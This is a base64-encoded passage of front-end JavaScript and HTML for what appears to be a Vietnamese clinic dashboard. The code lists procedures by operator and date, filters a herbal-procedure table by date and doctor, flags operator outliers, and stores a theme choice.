guZmxvb3Ioc2VjIC8gMzYwMCk7DQogICAgY29uc3QgbSA9IE1hdGguZmxvb3IoKHNlYyAlIDM2MDApIC8gNjApOw0KICAgIHJldHVybiBoLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKSArICdoJyArIG0udG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpOw0KfQ0KDQpmdW5jdGlvbiBzaG93UHJvY2VkdXJlc0Zvck9wZXJhdG9yKG9wZXJhdG9yLCBkYXRlKSB7DQogICAgY29uc3Qgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9jZWR1cmVPdmVybGF5Jyk7DQogICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwb3B1cENvbnRlbnQnKTsNCiAgICBjb25zdCBsaXN0ID0gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiBwLmRhdGUgPT09IGRhdGUpOw0KDQogICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxpPktow7RuZyB0w6xtIHRo4bqleSB0aOG7pyB0aHXhuq10PC9pPiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgbGlzdC5zb3J0KChhLCBiKSA9PiBhLnN0YXJ0IC0gYi5zdGFydCk7DQogICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gIjxiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9iPiAiICsgb3BlcmF0b3IgKyAiPGJyPjxiPk5nw6B5OjwvYj4gIiArIGRhdGUgKyAiPGJyPjxicj4iICsNCiAgICAgICAgICAgICI8dWwgc3R5bGU9J3BhZGRpbmctbGVmdDoyMHB4Jz4iICsgbGlzdC5tYXAocCA9PiANCiAgICAgICAgICAgICAgICAiPGxpPjxiPiIgKyBwLnBhdGllbnROYW1lICsgIjwvYj4gLSAiICsgcC5wcm9jZWR1cmUgKyAiICgiICsgcC5kaXNwbGF5U3RhcnQgKyAiIOKGkiAiICsgcC5kaXNwbGF5RW5kICsgIik8L2xpPiINCiAgICAgICAgICAgICkuam9pbignJykgKyAiPC91bD4iOw0KICAgIH0NCg0KICAgIG92ZXJsYXkuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCmZ1bmN0aW9uIGNsb3NlUHJvY2VkdXJlUG9wdXAoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2NlZHVyZU92ZXJsYXknKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KfQ0KPC9zY3JpcHQ+DQo8IS0tIFBvcHVwIHRo4bunIHRodeG6rXQgY2hpIHRp4bq/dCB24bubaSBvdmVybGF5IC0tPg0KPGRpdiBpZD0icHJvY2VkdXJlT3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC40KTt6LWluZGV4OjEwMDAwIiBvbmNsaWNrPSJjbG9zZVByb2NlZHVyZVBvcHVwKCkiPg0KICA8ZGl2IGlkPSJwcm9jZWR1cmVQb3B1cCIgb25jbGljaz0iZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCkiIHN0eWxlPSJwb3NpdGlvbjpyZWxhdGl2ZTt0b3A6MTAlO2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojMDAwO2JvcmRlcjoycHggc29saWQgIzM0OThkYjtwYWRkaW5nOjIwcHg7Ym9yZGVyLXJhZGl1czo4cHg7Ym94LXNoYWRvdzowIDVweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTttYXgtaGVpZ2h0Ojcwdmg7b3ZlcmZsb3c6YXV0bztmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmO21heC13aWR0aDo2MDBweCI+DQogICAgPGgzPkNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdDwvaDM+DQogICAgPGRpdiBpZD0icG9wdXBDb250ZW50Ij48L2Rpdj4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQcm9jZWR1cmVQb3B1cCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gcmVuZGVySGVyYkxpc3QoKSB7DQogICAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRhYmxlQm9keScpOw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgY29uc3QgaGVyYnMgPSB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW107DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQoNCiAgICBpZiAoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCkgew0KICAgICAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoID0+IGguZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGggPT4gaC5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQoNCiAgICAgICAgZG9jdG9yRmlsdGVyLmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgICAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCg0KICAgICAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAidHJ1ZSI7DQogICAgICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgICAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVySGVyYkxpc3QpOw0KICAgIH0NCg0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRhdGVGaWx0ZXIudmFsdWU7DQogICAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgICBjb25zdCBmaWx0ZXJlZEhlcmJzID0gaGVyYnMuZmlsdGVyKHAgPT4NCiAgICAgICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICAgICk7DQoNCiAgICBpZiAoZmlsdGVyZWRIZXJicy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoImhlcmItcm93Iik7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD5gOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgZmlsdGVyZWRIZXJicy5mb3JFYWNoKHAgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSDihpIgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3Aub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KDQpmdW5jdGlvbiB0b2dnbGVIZXJiTGlzdCgpIHsNCiAgICBjb25zdCB0YWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiUHJvY2VkdXJlVGFibGUnKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICByZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KPC9zY3JpcHQ+DQoNCg0KDQo8c2NyaXB0Pg0KKGZ1bmN0aW9uKCl7DQogIC8qID09PT0gVEnhu4ZOIMONQ0ggQ0hV4bqoTiBIT8OBIFTDik4gPT09PSAqLw0KICBmdW5jdGlvbiBjbGVhbkRpc3BsYXkobmFtZSl7DQogICAgcmV0dXJuIChuYW1lfHwnJykNCiAgICAgIC50b1N0cmluZygpDQogICAgICAucmVwbGFjZSgvWyzvvIxdK1xzKiQvLCcnKQ0KICAgICAgLnJlcGxhY2UoL1xzKy9nLCcgJykNCiAgICAgIC50cmltKCk7DQogIH0NCiAgZnVuY3Rpb24gbm9ybShuYW1lKXsNCiAgICByZXR1cm4gY2xlYW5EaXNwbGF5KG5hbWUpLnRvTG93ZXJDYXNlKCk7DQogIH0NCg0KICAvKiA9PT09IFTDjU5IIMSQQSBT4buQIFRIRU8gTkfDgFkgPT09PSAqLw0KICBmdW5jdGlvbiBjb21wdXRlTWFqb3JpdHlCeURhdGUocm93cyl7DQogICAgY29uc3QgbWFwID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgICByb3dzLmZvckVhY2gocj0+ew0KICAgICAgY29uc3QgZCA9IHIuZGF0ZTsNCiAgICAgIGNvbnN0IG4gPSBub3JtKHIub3BlcmF0b3IpOw0KICAgICAgaWYoIW4gfHwgbiA9PT0gJ2tow7RuZyBjw7MnKSByZXR1cm47DQogICAgICAobWFwW2RdfHwobWFwW2RdPXt9KSlbbl0gPSAobWFwW2RdW25dfHwwKSsxOw0KICAgIH0pOw0KICAgIGNvbnN0IG91dCA9IHt9Ow0KICAgIE9iamVjdC5rZXlzKG1hcCkuZm9yRWFjaChkPT57DQogICAgICBjb25zdCBhcnIgPSBPYmplY3QuZW50cmllcyhtYXBbZF0pLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgICBjb25zdCB0b3AgPSBhcnJbMF0gfHwgW251bGwsMF07DQogICAgICBjb25zdCBzZWNvbmQgPSBhcnJbMV0gfHwgW251bGwsMF07DQogICAgICBvdXRbZF0gPSB7IHRvcE5vcm06dG9wWzBdLCB0b3BDb3VudDp0b3BbMV0sIHNlY29uZENvdW50OnNlY29uZFsxXSB9Ow0KICAgIH0pOw0KICAgIHJldHVybiBvdXQ7DQogIH0NCg0KICAvKiA9PT09IFVJIFBI4bukOiBUw5NNIFThuq5UICsgUE9QVVAgPT09PSAqLw0KICBmdW5jdGlvbiBlbnN1cmVPdXRsaWVyVUkoKXsNCiAgICBjb25zdCBzdW1tYXJ5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyU3VtbWFyeScpOw0KICAgIGNvbnN0IG1vZGFsICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJNb2RhbCcpOw0KICAgIGlmKCFzdW1tYXJ5KSBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyU3VtbWFyeSB0cm9uZyBIVE1MIScpOw0KICAgIGlmKCFtb2RhbCkgICBjb25zb2xlLndhcm4oJ1RoaeG6v3UgI2hlcmJPdXRsaWVyTW9kYWwgdHJvbmcgSFRNTCEnKTsNCiAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYk91dGxpZXJDbG9zZUJ0bicpOw0KICAgIGNvbnN0IGJhY2tkcm9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQmFja2Ryb3AnKTsNCiAgICBpZihidG4pIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT5tb2RhbC5zdHlsZS5kaXNwbGF5PSdub25lJyk7DQogICAgaWYoYmFja2Ryb3ApIGJhY2tkcm9wLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9Pm1vZGFsLnN0eWxlLmRpc3BsYXk9J25vbmUnKTsNCiAgfQ0KICBlbnN1cmVPdXRsaWVyVUkoKTsNCg0KICAvKiA9PT09IEdISSDEkMOIIEjDgE0gUkVOREVSID09PT0gKi8NCiAgd2luZG93LnJlbmRlckhlcmJMaXN0ID0gZnVuY3Rpb24oKXsNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiVGFibGVCb2R5Jyk7DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRG9jdG9yRmlsdGVyJyk7DQogICAgY29uc3Qgc3VtbWFyeURpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllclN1bW1hcnknKTsNCiAgICBjb25zdCBtb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsJyk7DQogICAgY29uc3QgbW9kYWxCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxCb2R5Jyk7DQogICAgY29uc3QgbW9kYWxJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxJbmZvJyk7DQoNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIGNvbnN0IGhlcmJzUmF3ID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIHx8IFtdOw0KICAgIGNvbnN0IGhlcmJzID0gaGVyYnNSYXcubWFwKGg9Pih7DQogICAgICAuLi5oLA0KICAgICAgb3BDbGVhbjogY2xlYW5EaXNwbGF5KGgub3BlcmF0b3IpLA0KICAgICAgb3BOb3JtOiBub3JtKGgub3BlcmF0b3IpDQogICAgfSkpOw0KDQogICAgaWYoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCl7DQogICAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRhdGUpKV0uc29ydCgoYSxiKT0+ew0KICAgICAgICBjb25zdCBbZGEsbWEseWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICBjb25zdCBbZGIsbWIseWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsbWEtMSxkYSkgLSBuZXcgRGF0ZSh5YixtYi0xLGRiKTsNCiAgICAgIH0pOw0KICAgICAgY29uc3QgdW5pcXVlRG9jdG9ycyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRvY3Rvcnx8J0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCiAgICAgIGRhdGVGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICB1bmlxdWVEYXRlcy5tYXAoZD0+YDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICAgIGRvY3RvckZpbHRlci5pbm5lckhUTUwgPQ0KICAgICAgICAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIGLDoWMgc8SpPC9vcHRpb24+JyArDQogICAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgICBkYXRlRmlsdGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICB9DQoNCiAgICBjb25zdCBzZWxlY3RlZERhdGUgPSBkYXRlRmlsdGVyLnZhbHVlOw0KICAgIGNvbnN0IHNlbGVjdGVkRG9jdG9yID0gZG9jdG9yRmlsdGVyLnZhbHVlOw0KDQogICAgY29uc3QgZmlsdGVyZWQgPSBoZXJicy5maWx0ZXIocCA9Pg0KICAgICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgICAoc2VsZWN0ZWREb2N0b3IgPT09ICdhbGwnIHx8IHAuZG9jdG9yID09PSBzZWxlY3RlZERvY3RvcikNCiAgICApOw0KDQogICAgaWYoZmlsdGVyZWQubGVuZ3RoID09PSAwKXsNCiAgICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgICB0ci5pbm5lckhUTUwgPSAnPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD4nOw0KICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgICAgaWYoc3VtbWFyeURpdikgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBjb25zdCBtYWpvcml0eSA9IGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShoZXJicyk7DQogICAgY29uc3Qgb3V0bGllcnNJblZpZXcgPSBbXTsNCg0KICAgIGZpbHRlcmVkLmZvckVhY2gocD0+ew0KICAgICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgdHIuY2xhc3NOYW1lID0gJ2hlcmItcm93JzsNCiAgICAgIGNvbnN0IG0gPSBtYWpvcml0eVtwLmRhdGVdOw0KICAgICAgY29uc3QgaGFzTWFqb3JpdHkgPSBtICYmIG0udG9wTm9ybSAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudDsNCiAgICAgIGlmKGhhc01ham9yaXR5ICYmIHAub3BOb3JtICE9PSBtLnRvcE5vcm0pew0KICAgICAgICB0ci5jbGFzc0xpc3QuYWRkKCdoZXJiLW91dGxpZXInKTsNCiAgICAgICAgb3V0bGllcnNJblZpZXcucHVzaChwKTsNCiAgICAgIH0NCiAgICAgIHRyLmlubmVySFRNTCA9IGANCiAgICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9ICZyYXJyOyAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICAgIGA7DQogICAgICB0Ym9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgfSk7DQoNCiAgICBpZihzdW1tYXJ5RGl2KXsNCiAgICAgIGlmKG91dGxpZXJzSW5WaWV3Lmxlbmd0aCl7DQogICAgICAgIHN1bW1hcnlEaXYuc3R5bGUuZGlzcGxheT0nYmxvY2snOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9DQogICAgICAgICAgYDxhIGhyZWY9IiMiIGlkPSJoZXJiT3V0bGllckNvdW50TGluayI+Q8OzICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBjw7MgduG6pW4gxJHhu4EgdHJvbmcgZGFuaCBzw6FjaCBuw6B5LjwvYT5gOw0KICAgICAgICBjb25zdCBsaW5rID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyQ291bnRMaW5rJyk7DQogICAgICAgIGxpbmsuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihldil7DQogICAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgICBpZihtb2RhbEJvZHkpew0KICAgICAgICAgICAgbW9kYWxCb2R5LmlubmVySFRNTCA9ICcnOw0KICAgICAgICAgICAgb3V0bGllcnNJblZpZXcuZm9yRWFjaChwPT57DQogICAgICAgICAgICAgIGNvbnN0IHRyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgICAgdHIuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3AuZGF0ZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICAgICAgICAgICAgYDsNCiAgICAgICAgICAgICAgbW9kYWxCb2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgIH0NCiAgICAgICAgICBpZihtb2RhbEluZm8pew0KICAgICAgICAgICAgY29uc3Qgbm90ZURhdGUgPSAoc2VsZWN0ZWREYXRlPT09J2FsbCcpID8gJ25oaeG7gXUgbmfDoHknIDogc2VsZWN0ZWREYXRlOw0KICAgICAgICAgICAgbW9kYWxJbmZvLnRleHRDb250ZW50ID0gYFThu5VuZyAke291dGxpZXJzSW5WaWV3Lmxlbmd0aH0gY2Ega2jDoWMgxJFhIHPhu5EgKCR7bm90ZURhdGV9KS5gOw0KICAgICAgICAgIH0NCiAgICAgICAgICBpZihtb2RhbCkgbW9kYWwuc3R5bGUuZGlzcGxheT0nYmxvY2snOw0KICAgICAgICB9LCB7b25jZTp0cnVlfSk7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTD0nJzsNCiAgICAgIH0NCiAgICB9DQogIH07DQoNCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpPT57DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYodGFibGUgJiYgdGFibGUuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKXsNCiAgICAgIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0NCiAgfSk7DQp9KSgpOw0KDQoNCg0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChmaWxlSW5wdXQgJiYgYW5hbHl6ZUJ0bikgew0KICAgICAgZmlsZUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICAgICAgYW5hbHl6ZUJ0bi5jbGljaygpOw0KICAgICAgfSk7DQogICAgfQ0KICB9KTsNCjwvc2NyaXB0Pg0KDQoNCjwhLS0gVEhFTUUgUElDS0VSIFNDUklQVCAtLT4NCjxzY3JpcHQ+DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgVEhFTUVfS0VZID0gJ3VpQWNjZW50VGhlbWUnOw0KICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsNCiAgY29uc3QgcGlja2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RoZW1lUGlja2VyJyk7DQogIGlmKCFwaWNrZXIpIHJldHVybjsNCiAgZnVuY3Rpb24gYXBwbHlUaGVtZSh0KXsNCiAgICBib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ3RoZW1lLWRlZmF1bHQnLCd0aGVtZS1vcmFuZ2UnLCd0aGVtZS1yZWQnLCd0aGVtZS1ncmVlbicpOw0KICAgIGlmKHQgJiYgdCAhPT0gJ2RlZmF1bHQnKXsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtJyt0KTsNCiAgICB9IGVsc2Ugew0KICAgICAgYm9keS5jbGFzc0xpc3QuYWRkKCd0aGVtZS1kZWZhdWx0Jyk7IC8vIGV4cGxpY2l0IMSR4buDIGFjdGl2ZSByaW5nDQogICAgfQ0KICAgIHBpY2tlci5xdWVyeVNlbGVjdG9yQWxsKCcudGhlbWUtc3dhdGNoJykuZm9yRWFjaChidG49PnsNCiAgICAgIGJ0bi5jbGFzc0xpc3QudG9nZ2xlKCdpcy1hY3RpdmUnLCBidG4uZGF0YXNldC50aGVtZT09PXQgfHwgKHQ9PT0nJyAmJiBidG4uZGF0YXNldC50aGVtZT09PSdkZWZhdWx0JykpOw0KICAgIH0pOw0KICAgIHRyeXsgbG9jYWxTdG9yYWdlLnNldEl0ZW0oVEhFTUVfS0VZLHR8fCdkZWZhdWx0Jyk7IH1jYXRjaChlKXt9DQogIH0NCiAgY29uc3Qgc2F2ZWQgPSAoZnVuY3Rpb24oKXt0cnl7cmV0dXJuIGxvY2FsU3RvcmFnZS5nZXRJdGVtKFRIRU1FX0tFWSkgfHwgJ2RlZmF1bHQnO31jYXRjaChlKXtyZXR1cm4gJ2RlZmF1bHQnO319KSgpOw0KICBhcHBseVRoZW1lKHNhdmVkKTsNCiAgcGlja2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxlPT57DQogICAgY29uc3QgYnRuID0gZS50YXJnZXQuY2xvc2VzdCgnLnRoZW1lLXN3YXRjaCcpOw0KICAgIGlmKCFidG4pIHJldHVybjsNCiAgICBhcHBseVRoZW1lKGJ0bi5kYXRhc2V0LnRoZW1lKTsNCiAgf